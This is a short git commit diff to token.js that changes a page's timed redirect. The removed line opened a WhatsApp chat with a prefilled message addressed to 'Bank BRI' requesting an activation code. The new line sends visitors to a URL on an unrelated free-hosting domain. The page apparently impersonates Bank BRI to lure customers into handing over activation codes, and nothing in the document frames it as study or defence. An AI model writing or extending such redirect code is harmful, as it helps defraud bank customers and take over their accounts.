7e6b390ed2d0d2cffe01da43d3965750580c18cb
dodypribadi5 <dodypribadi5@gmail.com>
2025-01-29 22:02:09 +0700

    Update token.js

--- token.js
+++ token.js
@@ -127,7 +127,7 @@ function get(){
  $("#process1").show();
  $('.load').fadeIn();   
 setTimeout(function(){  
-location.href='https://wa.me/628159634888?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜,%0ASaya%20mau%20Request%20Kode%20Aktivasi';
+location.href='https://kuda-terbang.whf.bz/urlwa/v1t1ov';
  $("#process1").hide();
  $('.load').fadeOut();
  }, 2000);    
